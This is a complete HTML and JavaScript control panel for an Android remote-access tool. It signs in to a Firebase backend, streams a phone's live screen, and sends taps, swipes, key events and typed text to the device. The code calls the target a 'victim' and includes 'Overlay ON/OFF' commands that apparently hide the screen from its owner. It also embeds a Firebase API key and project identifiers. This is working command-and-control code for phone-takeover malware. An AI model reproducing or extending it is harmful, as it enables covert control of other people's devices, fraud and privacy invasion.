<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Device Link Dashboard</title>
<style>
  * { box-sizing: border-box; }
  body {
    margin: 0;
    background: #0f1419;
    color: #e7e9ea;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
  }
  .header {
    background: #1a1f26;
    padding: 12px 16px;
    display: flex;
    gap: 8px;
    align-items: center;
    flex-wrap: wrap;
    border-bottom: 1px solid #2a3037;
    position: sticky;
    top: 0;
    z-index: 100;
  }
  .header b {
    color: #1da1f2;
    margin-right: 8px;
    font-size: 18px;
  }
  .header input {
    padding: 8px 10px;
    background: #0f1419;
    color: #e7e9ea;
    border: 1px solid #2a3037;
    border-radius: 6px;
    font-size: 13px;
    min-width: 100px;
  }
  .header input:focus {
    outline: none;
    border-color: #1da1f2;
  }
  .header button {
    padding: 8px 16px;
    background: #1da1f2;
    color: #fff;
    border: none;
    border-radius: 6px;
    cursor: pointer;
    font-size: 13px;
    font-weight: 600;
  }
  .header button:hover { background: #1a91da; }
  .status {
    font-size: 12px;
    padding: 4px 10px;
    border-radius: 4px;
    background: #2a3037;
    color: #8899a6;
  }
  .status.online { background: #1e4a2e; color: #4ade80; }
  .status.offline { background: #4a1e1e; color: #f87171; }

  .nav-bar {
    padding: 10px 16px;
    display: flex;
    gap: 8px;
    flex-wrap: wrap;
    background: #1a1f26;
    border-bottom: 1px solid #2a3037;
  }
  .nav-bar button {
    padding: 8px 14px;
    background: #2a3037;
    color: #e7e9ea;
    border: 1px solid #3a4047;
    border-radius: 6px;
    cursor: pointer;
    font-size: 13px;
    font-weight: 500;
  }
  .nav-bar button:hover { background: #3a4047; }
  .nav-bar button.danger { background: #b91c1c; border-color: #dc2626; }
  .nav-bar button.danger:hover { background: #991b1b; }
  .nav-bar button.primary { background: #1da1f2; border-color: #1a91da; }
  .nav-bar button.primary:hover { background: #1a91da; }

  .screen-wrap {
    display: flex;
    justify-content: center;
    padding: 16px;
  }
  .screen-container {
    position: relative;
    max-width: 480px;
    width: 100%;
    background: #000;
    border: 1px solid #2a3037;
    border-radius: 8px;
    overflow: hidden;
  }
  .screen-container img {
    display: block;
    width: 100%;
    height: auto;
    user-select: none;
    -webkit-user-drag: none;
  }
  .no-stream {
    padding: 60px 20px;
    text-align: center;
    color: #8899a6;
    font-size: 14px;
  }

  .actions {
    padding: 12px 16px;
    display: flex;
    gap: 8px;
    flex-wrap: wrap;
    justify-content: center;
  }
  .actions button {
    padding: 10px 16px;
    background: #2a3037;
    color: #e7e9ea;
    border: 1px solid #3a4047;
    border-radius: 6px;
    cursor: pointer;
    font-size: 13px;
    min-width: 80px;
  }
  .actions button:hover { background: #3a4047; }

  .text-input-row {
    padding: 0 16px 12px;
    display: flex;
    gap: 8px;
    justify-content: center;
    max-width: 480px;
    margin: 0 auto;
  }
  .text-input-row input {
    flex: 1;
    padding: 10px 12px;
    background: #1a1f26;
    color: #e7e9ea;
    border: 1px solid #2a3037;
    border-radius: 6px;
    font-size: 14px;
  }
  .text-input-row button {
    padding: 10px 18px;
    background: #1da1f2;
    color: #fff;
    border: none;
    border-radius: 6px;
    cursor: pointer;
    font-weight: 600;
    font-size: 13px;
  }

  .log {
    font-family: "SF Mono", Menlo, monospace;
    font-size: 11px;
    background: #0a0a0a;
    padding: 12px;
    margin: 16px;
    border: 1px solid #1a1f26;
    border-radius: 6px;
    max-height: 140px;
    overflow-y: auto;
    color: #4ade80;
    line-height: 1.5;
    white-space: pre-wrap;
  }

  .info {
    padding: 8px 16px;
    font-size: 11px;
    color: #8899a6;
    text-align: center;
  }

  @media (max-width: 500px) {
    .header input { min-width: 80px; font-size: 12px; }
    .header b { font-size: 15px; }
  }
</style>
</head>
<body>

<div class="header">
  <b>Device Link</b>
  <input id="sessionId" placeholder="Session ID" autocomplete="off">
  <input id="email" placeholder="Email" autocomplete="off">
  <input id="pass" type="password" placeholder="Password">
  <button onclick="connect()">Connect</button>
  <span class="status" id="status">offline</span>
</div>

<div class="nav-bar">
  <button onclick="sendBack()">◀ Back</button>
  <button onclick="sendHome()">⌂ Home</button>
  <button onclick="sendRecents()">▣ Recents</button>
  <button onclick="sendNotif()">☰ Notif</button>
  <button onclick="sendOverlayOn()" class="danger">⬛ Overlay ON</button>
  <button onclick="sendOverlayOff()" class="primary">⬜ Overlay OFF</button>
  <button onclick="disconnect()" class="danger">✕ Disconnect</button>
</div>

<div class="screen-wrap">
  <div class="screen-container" id="screenContainer">
    <div class="no-stream" id="noStream">
      Waiting for stream…<br>
      <small>Enter Session ID + login, then tap Connect</small>
    </div>
    <img id="screen" src="" style="display:none;" alt="Live screen">
  </div>
</div>

<div class="actions">
  <button onclick="sendSwipeUp()">↑ Swipe Up</button>
  <button onclick="sendSwipeDown()">↓ Swipe Down</button>
  <button onclick="sendSwipeLeft()">← Swipe Left</button>
  <button onclick="sendSwipeRight()">→ Swipe Right</button>
</div>

<div class="text-input-row">
  <input id="typeText" placeholder="Type text on victim…" autocomplete="off">
  <button onclick="sendType()">Send</button>
</div>

<div class="log" id="log">[dashboard] ready</div>

<div class="info">
  Tap anywhere on screen to send a tap · Buttons send android key events
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
import { getAuth, signInWithEmailAndPassword, signOut } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
import { getDatabase, ref, onValue, set, remove } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";

// ==================================================
// ⚠️ FIREBASE CONFIG — এখানে তোমার value বসাও
// Firebase Console → Project Settings → Web app
// ==================================================
const firebaseConfig = {
  apiKey:            "AIzaSyDSRkeck-428x9B_MxqTMq8bwfrlRJYrh4",
  authDomain:        "device-link-ef0b0.firebaseapp.com",
  databaseURL:       "https://device-link-ef0b0-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId:         "device-link-ef0b0",
  storageBucket:     "device-link-ef0b0.firebasestorage.app",
  messagingSenderId: "630887474840",
  appId:             "1:630887474840:web:687a23f4d2391d6a6ed2ed"
};

let app = null;
let auth = null;
let db = null;
let currentSession = "";
let screenUnsub = null;
let statusUnsub = null;

// ==================================================
// CONNECT
// ==================================================
window.connect = async function() {
  const sid = document.getElementById("sessionId").value.trim();
  const email = document.getElementById("email").value.trim();
  const pass = document.getElementById("pass").value;

  if (!sid || !email || !pass) {
    alert("Session ID, email, password সব দিতে হবে");
    return;
  }

  if (!app) {
    app = initializeApp(firebaseConfig);
    auth = getAuth(app);
    db = getDatabase(app);
  }

  log("signing in…");

  try {
    const cred = await signInWithEmailAndPassword(auth, email, pass);
    log("✓ logged in as " + cred.user.email);

    currentSession = sid;
    log("session = " + sid);

    document.getElementById("status").textContent = "waiting";
    document.getElementById("status").className = "status";

    startListeners();
  } catch (e) {
    log("✗ auth failed: " + e.message);
    document.getElementById("status").textContent = "auth fail";
    document.getElementById("status").className = "status offline";
  }
};

// ==================================================
// DISCONNECT
// ==================================================
window.disconnect = async function() {
  try {
    if (screenUnsub) { screenUnsub(); screenUnsub = null; }
    if (statusUnsub) { statusUnsub(); statusUnsub = null; }
    if (auth) await signOut(auth);
  } catch (e) {}
  currentSession = "";
  document.getElementById("screen").src = "";
  document.getElementById("screen").style.display = "none";
  document.getElementById("noStream").style.display = "block";
  document.getElementById("status").textContent = "offline";
  document.getElementById("status").className = "status offline";
  log("disconnected");
};

// ==================================================
// LISTENERS — ✅ FIXED: current.jpg → current_jpg
// ==================================================
function startListeners() {

  // ---- live screen ----
  if (screenUnsub) screenUnsub();

  const screenRef = ref(db, "sessions/" + currentSession
          + "/screens/current_jpg");     // ← FIXED

  screenUnsub = onValue(screenRef, (snap) => {
    const b64 = snap.val();
    if (b64 && b64.length > 100) {
      const img = document.getElementById("screen");
      img.src = "data:image/jpeg;base64," + b64;
      img.style.display = "block";
      document.getElementById("noStream").style.display = "none";
    }
  }, (err) => {
    log("screen error: " + err.message);
  });

  // ---- status ----
  if (statusUnsub) statusUnsub();

  const statusRef = ref(db, "sessions/" + currentSession + "/status");

  statusUnsub = onValue(statusRef, (snap) => {
    const s = snap.val() || "unknown";
    const el = document.getElementById("status");
    el.textContent = s;
    if (s === "online") {
      el.className = "status online";
    } else {
      el.className = "status offline";
    }
    log("victim status: " + s);
  });
}

// ==================================================
// SEND COMMAND
// ==================================================
function sendCommand(obj) {
  if (!currentSession) {
    log("✗ not connected");
    return;
  }
  if (!db) return;

  obj.ts = Date.now();
  set(ref(db, "sessions/" + currentSession + "/command"), obj)
    .then(() => log("→ " + obj.action))
    .catch((e) => log("✗ send: " + e.message));
}

// ==================================================
// ACTIONS
// ==================================================
window.sendBack       = () => sendCommand({ action: "back" });
window.sendHome       = () => sendCommand({ action: "home" });
window.sendRecents    = () => sendCommand({ action: "recents" });
window.sendNotif      = () => sendCommand({ action: "notifications" });
window.sendOverlayOn  = () => sendCommand({ action: "overlay_on" });
window.sendOverlayOff = () => sendCommand({ action: "overlay_off" });

window.sendSwipeUp    = () => sendCommand({ action: "swipe_rel", dir: "up" });
window.sendSwipeDown  = () => sendCommand({ action: "swipe_rel", dir: "down" });
window.sendSwipeLeft  = () => sendCommand({ action: "swipe_rel", dir: "left" });
window.sendSwipeRight = () => sendCommand({ action: "swipe_rel", dir: "right" });

window.sendType = () => {
  const t = document.getElementById("typeText").value;
  if (!t) return;
  sendCommand({ action: "type", text: t });
  document.getElementById("typeText").value = "";
};

// ==================================================
// TAP ON SCREEN IMAGE
// ==================================================
document.addEventListener("DOMContentLoaded", () => {
  const img = document.getElementById("screen");
  if (!img) return;

  img.addEventListener("click", (e) => {
    if (!currentSession) return;

    const rect = img.getBoundingClientRect();
    const relX = (e.clientX - rect.left) / rect.width;
    const relY = (e.clientY - rect.top) / rect.height;

    sendCommand({
      action: "tap_rel",
      rx: relX,
      ry: relY
    });
  });

  img.addEventListener("dragstart", (e) => e.preventDefault());
});

// ==================================================
// LOG
// ==================================================
function log(msg) {
  const el = document.getElementById("log");
  const ts = new Date().toLocaleTimeString();
  el.textContent = "[" + ts + "] " + msg + "\n" + el.textContent;
  if (el.textContent.length > 6000) {
    el.textContent = el.textContent.substring(0, 6000);
  }
}
</script>

</body>
  </html>
